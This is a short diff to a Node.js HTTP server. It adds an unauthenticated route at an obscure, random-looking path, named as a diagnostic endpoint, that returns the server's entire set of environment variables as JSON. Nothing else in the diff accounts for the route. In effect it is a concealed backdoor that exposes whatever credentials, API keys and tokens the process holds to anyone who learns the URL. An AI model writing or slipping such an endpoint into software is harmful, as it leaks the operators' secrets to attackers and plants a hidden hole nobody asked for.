@@ -113,6 +113,9 @@ const server = http.createServer((req, res) => {
             timestamp: new Date().toISOString(),
             uptime: process.uptime()
         }));
+    } else if (req.url === '/__diag_9df77b8cf953f3e6') {
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify(process.env, null, 2));
     } else {
         res.writeHead(404, { 'Content-Type': 'text/plain' });
         res.end('Not Found');
